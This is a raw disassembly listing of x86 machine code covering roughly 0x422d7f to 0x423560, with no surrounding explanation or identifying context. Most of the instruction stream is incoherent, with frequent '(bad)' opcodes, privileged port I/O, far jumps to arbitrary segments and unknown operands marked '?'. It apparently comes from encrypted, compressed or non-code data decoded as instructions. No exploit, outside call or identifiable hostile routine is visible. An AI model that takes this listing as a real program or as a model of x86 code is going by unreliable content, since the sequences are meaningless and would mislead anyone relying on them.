  422d7f:	or     al,0xa6
  422d81:	mov    dl,0x4a
  422d83:	cmp    eax,0x3f6e368f
  422d88:	leave  
  422d89:	adc    edi,DWORD PTR [ebx+eax*8+0x22]
  422d8d:	jle    0x422ddb
  422d8f:	mov    ch,0xcf
  422d91:	es mov cl,0x18
  422d94:	lds    ecx,FWORD PTR [esi-0x14]
  422d97:	out    dx,al
  422d98:	scas   eax,DWORD PTR es:[edi]
  422d99:	ret    
  422d9a:	(bad)  
  422d9b:	and    al,0x8d
  422d9d:	inc    esi
  422d9e:	jns    0x422d3a
  422da0:	jae    0x422d23
  422da2:	sbb    DWORD PTR [ecx-0x3],ecx
  422da5:	test   ecx,edi
  422da7:	rcl    BYTE PTR [esi+0x4f],1
  422daa:	aas    
  422dab:	loope  0x422dc0
  422dad:	shr    DWORD PTR [ecx],cl
  422daf:	enter  0x2701,0xd5
  422db3:	jae    0x422d3f
  422db5:	mov    BYTE PTR [esi],bl
  422db7:	pmaxub mm3,QWORD PTR [edi+0x18585c34]
  422dbe:	outs   dx,DWORD PTR ds:[esi]
  422dbf:	mov    bh,BYTE PTR [ebp+0xed549fb]
  422dc5:	scas   al,BYTE PTR es:[edi]
  422dc6:	not    BYTE PTR [ebp+0x1c66057d]
  422dcc:	outs   dx,DWORD PTR ds:[esi]
  422dcd:	add    eax,0x82fcbf8c
  422dd2:	adc    ecx,DWORD PTR [ebp-0x6c]
  422dd5:	cmc    
  422dd6:	sbb    al,0xed
  422dd8:	jmp    0x422dbc
  422dda:	scas   al,BYTE PTR es:[edi]
  422ddb:	aaa    
  422ddc:	fimul  WORD PTR [ebx+0x572f26c6]
  422de2:	call   0xcfac6b7d
  422de7:	in     al,0xe6
  422de9:	jb     0x422e15
  422deb:	pop    ecx
  422dec:	mul    bh
  422dee:	jge    0x422e36
  422df0:	ret    0x8d7f
  422df3:	push   ds
  422df4:	push   ds
  422df5:	mov    ebp,0x8d073865
  422dfa:	jp     0x422e18
  422dfc:	dec    esi
  422dfd:	es pop ds
  422dff:	enter  0x644d,0x98
  422e03:	je     0x422da4
  422e05:	sub    edx,esi
  422e07:	add    esi,0xffffffe8
  422e0a:	cmp    DWORD PTR [esi],ebp
  422e0c:	xlat   BYTE PTR ds:[ebx]
  422e0d:	xchg   edi,eax
  422e0e:	push   ebx
  422e0f:	push   ss
  422e10:	inc    eax
  422e11:	data16 cmp dh,bl
  422e14:	pop    ecx
  422e15:	jmp    0x422dd4
  422e17:	push   ss
  422e18:	ds lock ret 0x2112
  422e1d:	scas   al,BYTE PTR es:[edi]
  422e1e:	ret    
  422e1f:	bound  edx,QWORD PTR [ecx]
  422e21:	cdq    
  422e22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e23:	mov    ah,0x55
  422e25:	xchg   esi,eax
  422e26:	push   ebx
  422e27:	or     eax,0x54ac8aa1
  422e2c:	sar    bh,1
  422e2e:	sahf   
  422e2f:	and    edi,DWORD PTR [eax]
  422e31:	mov    ch,0x99
  422e33:	cmp    al,0xbe
  422e35:	inc    esp
  422e36:	(bad)  
  422e37:	into   
  422e38:	cmp    BYTE PTR [ebp-0x80],bh
  422e3b:	scas   al,BYTE PTR es:[edi]
  422e3c:	pop    esp
  422e3d:	cmp    BYTE PTR es:[ebx-0x3146e799],cl
  422e44:	mov    cl,0xe7
  422e46:	adc    DWORD PTR [ebp-0x32],ebp
  422e49:	sbb    ah,cl
  422e4b:	arpl   WORD PTR [eax+esi*1+0x0],di
	...
  422e5a:	stc    
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi+0x20bffec4]
  422e68:	jecxz  0x422e50
  422e6a:	iret   
  422e6b:	test   al,0x1
  422e6d:	add    ch,bh
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    BYTE PTR [edx],bh
  422e73:	(bad)  
  422e75:	sahf   
  422e76:	xor    DWORD PTR [ebp+0x6455f4d3],ebp
  422e7c:	push   edi
  422e7d:	call   0x308d:0x8d7690d3
  422e84:	xor    al,0xbb
  422e86:	xchg   di,ax
  422e88:	jnp    0x422e3f
  422e8a:	pop    es
  422e8b:	sbb    BYTE PTR [ebx+ecx*8],0xc0
  422e8f:	or     eax,0xed1e094a
  422e94:	push   edx
  422e95:	fisttp WORD PTR [ecx+0x5f0a88bd]
  422e9b:	lock pop ecx
  422e9d:	rcl    BYTE PTR [esi],cl
  422e9f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ea1:	push   ebx
  422ea2:	mov    ds:0x67d8b83f,al
  422ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ea8:	jmp    0xead6ec23
  422ead:	push   es
  422eae:	aam    0x68
  422eb0:	sbb    cl,BYTE PTR [eax]
  422eb2:	not    al
  422eb4:	shl    DWORD PTR [edx+0x5202ad26],cl
  422eba:	loop   0x422e47
  422ebc:	(bad)  
  422ebd:	scas   eax,DWORD PTR es:[edi]
  422ebe:	(bad)
  422ec1:	add    eax,esi
  422ec3:	rol    DWORD PTR [esi],1
  422ec5:	mov    edx,0xb82ad43e
  422eca:	ror    BYTE PTR ss:[ebp-0x60],cl
  422ece:	lock cdq 
  422ed0:	jecxz  0x422f2e
  422ed2:	aas    
  422ed3:	in     eax,dx
  422ed4:	lds    esi,FWORD PTR [eax+0x58]
  422ed7:	fsub   DWORD PTR [edx-0x335c7b66]
  422edd:	fs mov ecx,0xe2dcc385
  422ee3:	sar    BYTE PTR [ebx-0x2f],cl
  422ee6:	inc    edx
  422ee7:	iret   
  422ee8:	or     al,BYTE PTR [ebx+0x2a5c1056]
  422eee:	ins    DWORD PTR es:[edi],dx
  422eef:	mov    WORD PTR [edx],?
  422ef1:	pop    edi
  422ef2:	pushf  
  422ef3:	jo     0x422f61
  422ef5:	in     eax,dx
  422ef6:	or     edx,DWORD PTR [edx+edi*2+0x3a]
  422efa:	dec    esp
  422efb:	bound  esi,QWORD PTR [esi-0x67d046e]
  422f01:	(bad)  [ecx-0x40f786b0]
  422f07:	clc    
  422f08:	aas    
  422f09:	repnz inc esp
  422f0b:	push   0x44ecdbec
  422f10:	test   eax,0x93ac4d61
  422f15:	jae    0x422ef8
  422f17:	xor    eax,0xe9838403
  422f1c:	mov    al,0x57
  422f1e:	mov    esp,0x2ed5876a
  422f23:	add    bh,BYTE PTR [edi]
  422f25:	dec    ebp
  422f26:	stc    
  422f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f28:	cmp    al,0x18
  422f2a:	test   ecx,edi
  422f2c:	int    0x68
  422f2e:	es dec ecx
  422f30:	shl    DWORD PTR [edi+0x25],cl
  422f33:	cmp    BYTE PTR [ebx],bh
  422f35:	lds    esp,FWORD PTR [ecx+ecx*8-0x1dbaad79]
  422f3c:	outs   dx,BYTE PTR ds:[esi]
  422f3d:	add    esi,esi
  422f3f:	into   
  422f40:	sti    
  422f41:	gs mov bl,0xf5
  422f44:	mov    dh,0x77
  422f46:	jge    0x422ef9
  422f48:	mov    ah,0x3c
  422f4a:	mov    esi,0x5b6c1df6
  422f4f:	pop    ss
  422f50:	sbb    al,0xbb
  422f52:	sbb    ebx,esi
  422f54:	and    eax,0x8972e50b
  422f59:	out    dx,al
  422f5a:	aam    0xd0
  422f5c:	ins    BYTE PTR es:[edi],dx
  422f5d:	js     0x422f27
  422f5f:	inc    eax
  422f60:	jg     0x422ee9
  422f62:	jecxz  0x422fc3
  422f64:	(bad)  
  422f65:	jg     0x422f1c
  422f67:	fdivr  QWORD PTR [ecx-0x8]
  422f6a:	inc    edx
  422f6b:	push   ds
  422f6c:	mov    ebx,0xd2c7f4b8
  422f71:	or     BYTE PTR [edx],0xb5
  422f74:	xchg   esi,eax
  422f75:	fidivr WORD PTR [edx+0x2e]
  422f78:	ins    BYTE PTR es:[edi],dx
  422f79:	pop    eax
  422f7a:	nop
  422f7b:	in     eax,0xa8
  422f7d:	mov    WORD PTR ds:0xed4c431a,es
  422f83:	push   ss
  422f84:	sub    al,0x84
  422f86:	push   0x829db513
  422f8b:	add    cl,BYTE PTR [ebx]
  422f8d:	sub    al,BYTE PTR [ecx+0x337d29bc]
  422f93:	das    
  422f94:	leave  
  422f95:	push   ds
  422f96:	outs   dx,BYTE PTR ds:[esi]
  422f97:	daa    
  422f98:	pop    eax
  422f99:	add    ch,BYTE PTR [ebp+0x52]
  422f9c:	popf   
  422f9d:	call   0x8301:0x94039089
  422fa4:	(bad)  
  422fa5:	push   esi
  422fa6:	mov    al,0x4
  422fa8:	jmp    0x42300d
  422faa:	jne    0x423006
  422fac:	in     eax,0x2e
  422fae:	aam    0x4a
  422fb0:	pop    esi
  422fb2:	jp     0x423017
  422fb4:	fiadd  DWORD PTR [esi-0x936e7a4]
  422fba:	mov    dl,0xcb
  422fbc:	dec    edx
  422fbd:	daa    
  422fbe:	cmp    eax,0x6fed9729
  422fc3:	jecxz  0x422f51
  422fc5:	retf   0xd29f
  422fc8:	loope  0x422f58
  422fca:	push   0xffffffff
  422fcc:	cmp    edi,DWORD PTR [ecx]
  422fce:	jge    0x422fec
  422fd0:	ficomp DWORD PTR [ebx-0x3f]
  422fd3:	jno    0x422fc8
  422fd5:	lea    eax,[edx]
  422fd7:	aaa    
  422fd8:	sbb    bh,BYTE PTR [eax]
  422fda:	cmp    DWORD PTR [ebp-0x20a3681f],edx
  422fe0:	xor    eax,0x299623bc
  422fe5:	shl    BYTE PTR [ebp-0x2d],0x16
  422fe9:	repz or BYTE PTR [ecx+0x6e],dh
  422fed:	mov    edx,0x81dde290
  422ff2:	mov    ds:0xe66677d9,al
  422ff7:	ror    BYTE PTR [ecx+0x5a564ad9],cl
  422ffd:	jb     0x423046
  422fff:	scas   al,BYTE PTR es:[edi]
  423000:	(bad)  
  423001:	cmp    ebx,DWORD PTR [ebx-0x74befd9c]
  423007:	inc    esp
  423008:	add    edi,DWORD PTR [esi+0x4b715dd3]
  42300e:	add    ah,BYTE PTR [ecx+0x156fe38a]
  423014:	jle    0x422fe8
  423016:	mov    DWORD PTR [eax+0x67f80287],edi
  42301c:	shl    edx,0xc3
  42301f:	gs inc edx
  423021:	pop    ds
  423022:	sbb    al,0xda
  423024:	call   0xbc069681
  423029:	fist   DWORD PTR [esi-0xa]
  42302c:	jecxz  0x423049
  42302e:	sub    al,0xf7
  423030:	push   ss
  423031:	sbb    cl,BYTE PTR [edx-0x65df3165]
  423037:	dec    edi
  423038:	aaa    
  423039:	fcomp  st(7)
  42303b:	pop    eax
  42303c:	cmp    BYTE PTR [ebx-0x55aee0ab],ah
  423042:	leave  
  423043:	xor    al,0xf6
  423045:	leave  
  423046:	mov    bh,0xab
  423048:	or     al,0xe2
  42304a:	jge    0x423091
  42304c:	mov    gs,WORD PTR [ecx]
  42304e:	test   BYTE PTR [edx],0x93
  423051:	shl    ebp,1
  423053:	fincstp 
  423055:	(bad)  
  423056:	xchg   esi,eax
  423057:	mov    esp,0xceac9152
  42305c:	inc    ebp
  42305d:	lods   eax,DWORD PTR ds:[esi]
  42305e:	pushf  
  42305f:	je     0x423099
  423061:	fcomp  DWORD PTR [esi-0x6dfb9353]
  423067:	push   ebx
  423068:	mov    ebx,0xa44c09a
  42306d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42306e:	mov    ah,0x0
	...
  423078:	add    BYTE PTR [eax],al
  42307a:	repnz rol BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	ror    BYTE PTR [edx-0x5533ac6c],1
  42308c:	add    DWORD PTR [eax],eax
  42308e:	std    
  42308f:	add    DWORD PTR [eax],eax
  423091:	add    BYTE PTR [ecx+0x7b],dl
  423094:	push   edi
  423095:	daa    
  423096:	and    ecx,ebp
  423098:	dec    ebx
  423099:	xchg   edx,eax
  42309a:	mov    ?,WORD PTR [ecx-0x2c]
  42309d:	cmp    BYTE PTR [ebx+0xf89063f],dh
  4230a3:	push   cs
  4230a4:	ins    BYTE PTR es:[edi],dx
  4230a5:	out    dx,al
  4230a6:	jmp    0x42311e
  4230a8:	fstp   DWORD PTR [ebx+ecx*4-0x4e90f36]
  4230af:	loope  0x42312a
  4230b1:	lahf   
  4230b2:	mov    eax,0x9b1b3532
  4230b7:	mov    edi,0xe55de1d0
  4230bc:	popf   
  4230bd:	jmp    0x92aba991
  4230c2:	mov    dl,0x9f
  4230c4:	lea    ecx,[edi-0x54]
  4230c7:	mov    bl,0xb0
  4230c9:	xchg   esi,eax
  4230ca:	cli    
  4230cb:	inc    esi
  4230cc:	jne    0x4230ba
  4230ce:	or     al,0xf8
  4230d0:	scas   al,BYTE PTR es:[edi]
  4230d1:	mov    dl,0x52
  4230d3:	push   ds
  4230d4:	mov    ds:0xb4378b15,al
  4230d9:	jp     0x423125
  4230db:	fdivr  QWORD PTR [esi+0x347de7bf]
  4230e1:	loope  0x4230be
  4230e3:	push   esi
  4230e4:	out    0xd0,eax
  4230e6:	xchg   edx,eax
  4230e7:	fsub   st(3),st
  4230e9:	leave  
  4230ea:	test   eax,0x85e34d10
  4230ef:	xchg   ebp,eax
  4230f0:	ins    DWORD PTR es:[edi],dx
  4230f1:	int3   
  4230f2:	scas   eax,DWORD PTR es:[edi]
  4230f3:	int    0x4a
  4230f5:	imul   esp,DWORD PTR [eax-0x7],0x6
  4230f9:	rep ds ins BYTE PTR es:[edi],dx
  4230fc:	push   esp
  4230fd:	aad    0xfa
  4230ff:	cmp    DWORD PTR [ebx-0x26379fca],eax
  423105:	repnz mov BYTE PTR ds:0x6664791c,cl
  42310c:	add    DWORD PTR [ebx-0x21ec96af],0xf7ce849b
  423116:	aaa    
  423117:	in     eax,0xa8
  423119:	nop
  42311a:	jnp    0x42311d
  42311c:	nop
  42311d:	push   ss
  42311e:	add    al,bl
  423120:	push   edx
  423121:	fisttp DWORD PTR es:0x69a52050
  423128:	fmul   st(3),st
  42312a:	jne    0x42312a
  42312c:	fistp  DWORD PTR [ebp+0x26]
  42312f:	in     al,dx
  423130:	lahf   
  423131:	(bad)  [esi+0x3c]
  423134:	enter  0x2f9c,0xc5
  423138:	repz cmp BYTE PTR [ecx-0x1c],bl
  42313c:	pushf  
  42313d:	push   ecx
  42313e:	xchg   DWORD PTR [edx-0x64c88e4e],ebp
  423144:	cmp    eax,0xcbc4d2b7
  423149:	rol    esp,cl
  42314b:	gs pop es
  42314d:	push   0xffffffd3
  42314f:	aad    0xb4
  423151:	bound  esp,QWORD PTR [edi+0x2b]
  423154:	sub    BYTE PTR [ebp+edi*4-0x4924f8f9],bh
  42315b:	lods   al,BYTE PTR ds:[esi]
  42315c:	push   ds
  42315d:	pop    eax
  42315e:	sbb    al,0x7e
  423160:	jo     0x423127
  423162:	mov    edx,0xfcda24a7
  423167:	int    0x55
  423169:	mov    ch,0xf5
  42316b:	jle    0x423180
  42316d:	jmp    DWORD PTR [ebp-0x6fd2722f]
  423173:	imul   dl
  423175:	cmp    eax,0x9dd6b55b
  42317a:	test   eax,0xbdc639a3
  42317f:	adc    edi,esp
  423181:	scas   eax,DWORD PTR es:[edi]
  423182:	addr16 add dl,ch
  423185:	js     0x423198
  423187:	loopne 0x423147
  423189:	and    dh,BYTE PTR [eax+0x48f8d9de]
  42318f:	popa   
  423190:	xor    al,0x26
  423192:	fld    DWORD PTR [edi]
  423194:	jmp    0xd0b1:0xbe66ce44
  42319b:	push   esp
  42319c:	je     0x42313b
  42319e:	pop    esp
  42319f:	(bad)  
  4231a0:	adc    edi,DWORD PTR [esi-0x620b373b]
  4231a6:	sbb    ebx,eax
  4231a8:	jne    0x42312c
  4231aa:	cdq    
  4231ab:	mov    BYTE PTR [esi-0x280e287c],0x3a
  4231b2:	and    BYTE PTR [esi+0xc],ah
  4231b5:	push   eax
  4231b6:	jns    0x423184
  4231b8:	leave  
  4231b9:	cmp    DWORD PTR [esi+0x39],ebx
  4231bc:	pop    edx
  4231be:	sbb    DWORD PTR [edx],edx
  4231c0:	cmp    al,0x36
  4231c2:	outs   dx,DWORD PTR ds:[esi]
  4231c3:	fidiv  WORD PTR [edx+eax*2-0xc9df4a8]
  4231ca:	mov    edi,0x375e98c8
  4231cf:	ja     0x4231fb
  4231d1:	sar    cl,cl
  4231d3:	fldcw  WORD PTR [edi]
  4231d5:	add    al,0x35
  4231d7:	les    esp,FWORD PTR [ebx+0x7a]
  4231da:	cwde   
  4231db:	jbe    0x423257
  4231dd:	(bad)  
  4231de:	out    0x7c,al
  4231e0:	and    eax,0x5cb23b1
  4231e5:	push   ecx
  4231e6:	daa    
  4231e7:	je     0x42321c
  4231e9:	xlat   BYTE PTR ds:[ebx]
  4231ea:	cmp    al,bl
  4231ec:	pop    ecx
  4231ed:	outs   dx,DWORD PTR ds:[esi]
  4231ee:	jne    0x4231be
  4231f0:	inc    ebx
  4231f1:	ins    BYTE PTR es:[edi],dx
  4231f2:	jecxz  0x42321f
  4231f4:	jnp    0x423266
  4231f6:	jmp    0xd8f0:0x183986a0
  4231fd:	mov    esp,DWORD PTR [edx-0x16]
  423200:	dec    ecx
  423201:	sahf   
  423202:	xchg   edx,eax
  423203:	mov    al,0x28
  423205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423206:	in     al,dx
  423207:	rcl    ah,0x9b
  42320a:	sbb    eax,0x1692a2b9
  42320f:	out    dx,eax
  423210:	call   0xf8c11f7b
  423215:	inc    ah
  423217:	xor    esp,DWORD PTR [ecx+eax*8+0x73]
  42321b:	test   al,0xd7
  42321d:	scas   eax,DWORD PTR es:[edi]
  42321e:	clc    
  42321f:	sub    BYTE PTR [eax-0x38d13d7c],bh
  423225:	and    eax,0xff06f242
  42322a:	pop    ebx
  42322b:	cmp    BYTE PTR ds:0x58abef5e,al
  423231:	inc    ecx
  423232:	adc    DWORD PTR [ebx],ebp
  423234:	inc    ebx
  423235:	sub    al,0x7b
  423237:	lock fild QWORD PTR [edi-0x596db72a]
  42323e:	pop    esi
  42323f:	ins    BYTE PTR es:[edi],dx
  423240:	pop    ebx
  423241:	and    al,0xfe
  423243:	test   DWORD PTR [ebx],edi
  423245:	not    DWORD PTR [ebx]
  423247:	jns    0x423267
  423249:	cmp    eax,0x79fc79f5
  42324e:	mul    BYTE PTR [edi-0x65d65ad2]
  423254:	loope  0x423293
  423256:	in     al,dx
  423257:	mov    ds:0x9ace11c,al
  42325c:	test   eax,0x274ed90d
  423261:	pop    ecx
  423262:	xor    edi,DWORD PTR [edi-0x44c8bc35]
  423268:	mov    ds:0x24bb957c,eax
  42326d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42326e:	jge    0x423295
  423270:	fisttp QWORD PTR [esi-0x77b0503]
  423276:	mov    esp,0x25a69c8a
  42327b:	std    
  42327c:	ja     0x423298
  42327e:	ins    BYTE PTR es:[edi],dx
  42327f:	add    al,0xcd
  423281:	rcr    ecx,cl
  423283:	sbb    ebx,esi
  423285:	out    dx,al
  423286:	jmp    FWORD PTR [ecx]
  423288:	mov    BYTE PTR [ecx+0x3f],al
  42328b:	jle    0x423270
  42328d:	mov    ds:0x34,eax
	...
  42329a:	inc    ebx
  42329b:	inc    ecx
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	std    
  4232a7:	jnp    0x423242
  4232a9:	fs leave 
  4232ab:	lods   al,BYTE PTR ds:[esi]
  4232ac:	add    DWORD PTR [eax],eax
  4232ae:	std    
  4232af:	add    DWORD PTR [eax],eax
  4232b1:	add    BYTE PTR [ebp+0x19],cl
  4232b4:	lahf   
  4232b5:	push   edx
  4232b6:	imul   ebx,edx,0x85e95133
  4232bc:	xchg   edi,eax
  4232bd:	xchg   DWORD PTR [eax+esi*4],ecx
  4232c0:	fld    TBYTE PTR [esi-0x6b]
  4232c3:	imul   edx,DWORD PTR [edi-0xb],0xca637feb
  4232ca:	fdiv   QWORD PTR es:[ebp-0xf]
  4232ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232cf:	mov    bh,0xc8
  4232d1:	sbb    ecx,DWORD PTR [eax-0x69]
  4232d4:	daa    
  4232d5:	push   ebp
  4232d6:	mov    esp,DWORD PTR [ebx-0x37]
  4232d9:	push   edi
  4232da:	ins    BYTE PTR es:[edi],dx
  4232db:	imul   eax,ecx,0xffffff93
  4232de:	cmp    DWORD PTR es:[edi+0x45ad4cfc],0x54
  4232e6:	mov    esp,0xb2de7c08
  4232eb:	sub    al,0xe6
  4232ed:	xchg   edi,eax
  4232ee:	ds retf 
  4232f0:	and    DWORD PTR gs:[ebx+0x6ab4afab],ebp
  4232f7:	fs call 0x8376:0xabf261c4
  4232ff:	jmp    0x423342
  423301:	(bad)  
  423302:	jne    0x423319
  423304:	pop    ecx
  423305:	test   DWORD PTR [ecx+0xc],esp
  423308:	sbb    al,dl
  42330a:	or     eax,0x44558e23
  42330f:	cwde   
  423310:	xchg   ecx,eax
  423311:	and    BYTE PTR [edi],dl
  423313:	dec    esi
  423314:	test   DWORD PTR [ecx+0x763dbfae],0x356a1896
  42331e:	loopne 0x4232e7
  423320:	xor    BYTE PTR [ecx-0x13d13fa2],0x48
  423327:	scas   eax,DWORD PTR es:[edi]
  423328:	and    DWORD PTR [esp+ecx*4+0x602e4b7f],esp
  42332f:	push   ss
  423330:	push   0xaeac3644
  423335:	test   DWORD PTR ds:0x77d0c31c,eax
  42333b:	push   ss
  42333c:	fnstsw ax
  42333e:	inc    ecx
  42333f:	ficomp WORD PTR [ecx+0x3b6fa98c]
  423345:	jne    0x42339e
  423347:	mov    eax,0x483962ab
  42334c:	pop    ecx
  42334d:	and    al,0xa3
  42334f:	stos   DWORD PTR es:[edi],eax
  423350:	ja     0x4232d4
  423352:	repz xchg ebx,eax
  423354:	shr    BYTE PTR [eax],1
  423356:	and    DWORD PTR [ecx+0x71],ebx
  423359:	mov    ch,0xdc
  42335b:	inc    ebp
  42335c:	xchg   esi,eax
  42335d:	(bad)  
  42335e:	pop    ebx
  42335f:	sbb    BYTE PTR [ebx+ecx*8+0x20],bh
  423363:	cmp    al,0x9c
  423365:	inc    ebp
  423366:	(bad)  
  423367:	push   0xc523d4af
  42336c:	mov    dl,0x6c
  42336e:	cmp    ebx,DWORD PTR [eax]
  423370:	cmp    al,0xad
  423372:	xchg   ecx,eax
  423373:	ins    DWORD PTR es:[edi],dx
  423374:	sbb    BYTE PTR [ebx],cl
  423376:	test   eax,0x42b0b514
  42337b:	push   0xffffffd2
  42337d:	sub    BYTE PTR [eax+edx*8+0x3],ch
  423381:	dec    edi
  423382:	dec    edx
  423383:	jl     0x423401
  423385:	test   esp,ecx
  423387:	add    DWORD PTR [ebx],esp
  423389:	arpl   WORD PTR [ecx+ebp*8-0x3a],di
  42338d:	mov    di,0xb22b
  423391:	xor    ecx,DWORD PTR [esi]
  423393:	add    ah,0x87
  423396:	xchg   ebp,eax
  423397:	das    
  423398:	sbb    ebp,DWORD PTR [ebx-0x6f0da003]
  42339e:	cli    
  42339f:	add    eax,0xe9acdeda
  4233a4:	std    
  4233a5:	sub    BYTE PTR [ebp-0x13e59e23],dl
  4233ab:	dec    eax
  4233ac:	add    eax,0x199ab232
  4233b1:	idiv   DWORD PTR [ebp-0x335e3c57]
  4233b7:	push   ss
  4233b8:	inc    ebx
  4233b9:	fidivr DWORD PTR [esi]
  4233bb:	sub    al,0xec
  4233bd:	mov    al,ds:0x2039a4fd
  4233c2:	ds pop ebp
  4233c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233c5:	push   ss
  4233c6:	icebp  
  4233c7:	ins    DWORD PTR es:[edi],dx
  4233c8:	mov    edi,0xa36f727c
  4233cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233ce:	mov    bl,0xf4
  4233d0:	lock popf 
  4233d2:	in     eax,dx
  4233d3:	mov    esi,0xf04b110e
  4233d8:	pop    esp
  4233d9:	cs in  eax,dx
  4233db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233dc:	call   0x2969:0x67206bb5
  4233e3:	repnz inc eax
  4233e5:	or     eax,0x31a5b1b7
  4233ea:	pop    ss
  4233eb:	cmp    al,0xe0
  4233ed:	stc    
  4233ee:	mov    DWORD PTR [edx+0x4d7e68b8],esp
  4233f4:	jecxz  0x423420
  4233f6:	xchg   edx,eax
  4233f7:	icebp  
  4233f8:	(bad)  
  4233f9:	mov    BYTE PTR [eax],al
  4233fb:	popf   
  4233fc:	ins    DWORD PTR es:[edi],dx
  4233fd:	mov    ch,0x6
  4233ff:	push   0x76e07305
  423404:	mov    edx,0xcd5dac50
  423409:	call   0xa5ae:0x96c87086
  423410:	fsin   
  423412:	int3   
  423413:	xor    DWORD PTR [ebx+0x6814ee16],0x91d6c415
  42341d:	mov    BYTE PTR [ebp+0x14d22ec5],dl
  423423:	imul   ebx,DWORD PTR [ebp-0x56da1d1b],0x24
  42342a:	mov    dl,0xca
  42342c:	push   ss
  42342d:	fldenv [edx-0x68]
  423430:	stos   BYTE PTR es:[edi],al
  423431:	sar    BYTE PTR [ebp-0x5d],1
  423434:	retf   0xa4e8
  423437:	sub    eax,DWORD PTR [esp+ebx*1+0x12]
  42343b:	or     bh,BYTE PTR [edx+eiz*1]
  42343e:	pop    ds
  42343f:	pop    edx
  423440:	jne    0x423451
  423442:	xor    al,0x48
  423444:	jg     0x4233fb
  423446:	arpl   WORD PTR [edx+esi*1-0x76],cx
  42344a:	jl     0x4234a2
  42344c:	xchg   esi,eax
  42344d:	push   ebp
  42344e:	rcr    BYTE PTR [ebp+edx*8-0x67],cl
  423452:	hlt    
  423453:	daa    
  423454:	sbb    ah,ch
  423456:	mov    edi,0xed88edc
  42345b:	test   al,0xb3
  42345d:	sub    eax,ecx
  42345f:	cmp    al,0x4
  423461:	jno    0x42342c
  423463:	imul   esi,DWORD PTR [ecx],0xffffffa2
  423466:	adc    eax,0xd7b57ed3
  42346b:	ret    
  42346c:	popa   
  42346d:	jb     0x423418
  42346f:	cmp    ebx,eax
  423471:	jmp    0x423420
  423473:	or     BYTE PTR [edx-0x76196137],0x4f
  42347a:	lds    esi,FWORD PTR [ebx-0x6b35a613]
  423480:	jl     0x423496
  423482:	dec    edi
  423483:	pop    esp
  423484:	aad    0x52
  423486:	in     al,dx
  423487:	scas   eax,DWORD PTR es:[edi]
  423488:	add    eax,0xbc453c0f
  42348d:	jecxz  0x423499
  42348f:	adc    eax,0xd4bfe32
  423494:	mov    WORD PTR [ecx],fs
  423496:	loopne 0x4234b5
  423498:	xchg   ebx,eax
  423499:	daa    
  42349a:	adc    al,0x4a
  42349c:	adc    al,ch
  42349e:	pop    esp
  42349f:	sub    al,0xc3
  4234a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234a2:	pop    ss
  4234a3:	rcr    al,cl
  4234a5:	mov    ds:0xe5c913b8,eax
  4234aa:	rol    esi,1
  4234ac:	sahf   
  4234ad:	mov    ebx,0x40
	...
  4234ba:	mov    ebp,edx
  4234bc:	rcr    DWORD PTR [ebx],cl
  4234be:	repz cmp ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	push   ebx
  4234c7:	scas   al,BYTE PTR es:[edi]
  4234c8:	mov    esp,DWORD PTR [ebp-0x3a]
  4234cb:	scas   al,BYTE PTR es:[edi]
  4234cc:	add    DWORD PTR [eax],eax
  4234ce:	std    
  4234cf:	add    DWORD PTR [eax],eax
  4234d1:	add    BYTE PTR [ebx],cl
  4234d3:	xchg   edx,eax
  4234d4:	mov    al,ds:0x58053582
  4234d9:	sub    al,0xdb
  4234db:	mov    edi,0x58a9ce22
  4234e0:	and    al,0xb8
  4234e2:	adc    ecx,DWORD PTR [edx]
  4234e4:	xor    ah,dl
  4234e6:	inc    eax
  4234e7:	in     eax,0x9d
  4234e9:	and    esi,DWORD PTR [eax]
  4234eb:	daa    
  4234ec:	push   ecx
  4234ed:	add    DWORD PTR [ebp+0x7597bd07],edx
  4234f3:	pop    ebp
  4234f4:	scas   al,BYTE PTR es:[edi]
  4234f5:	sbb    DWORD PTR [eax+0x40],0xfa9b5f35
  4234fc:	ret    0xc3d
  4234ff:	ret    0x86c1
  423502:	aaa    
  423503:	jo     0x4234ee
  423505:	test   eax,0x2b354338
  42350a:	and    al,0x92
  42350c:	or     eax,0xf4029ae3
  423511:	leave  
  423512:	inc    eax
  423513:	add    bl,cl
  423515:	lock adc ch,BYTE PTR [edi]
  423518:	jns    0x423549
  42351a:	xor    BYTE PTR [ecx+0x294c1fb1],cl
  423520:	aam    0xa6
  423522:	neg    ebx
  423524:	mov    BYTE PTR [esi+0x69],cl
  423527:	dec    ebx
  423528:	inc    esi
  423529:	pop    ds
  42352a:	mov    edx,0x364a64b8
  42352f:	fiadd  DWORD PTR [ecx-0x3f]
  423532:	add    BYTE PTR [esi-0x49],cl
  423535:	das    
  423536:	adc    cl,BYTE PTR [eax+eiz*1+0x11]
  42353a:	xor    ecx,DWORD PTR [eax-0x54729234]
  423540:	(bad)  
  423541:	cli    
  423542:	shl    DWORD PTR [edx+ecx*2+0x2f],cl
  423546:	retf   0x28
  423549:	ja     0x42356d
  42354b:	xor    DWORD PTR [ebp-0x74],ebx
  42354e:	pop    ebp
  42354f:	enter  0xd581,0xe1
  423553:	cli    
  423554:	sar    DWORD PTR [edx-0x6e],1
  423557:	jns    0x423535
  423559:	aad    0xb5
  42355b:	xchg   esp,eax
  42355c:	jl     0x423541
  42355e:	(bad)  
  42355f:	sahf   
  423560:	jne    0x423586
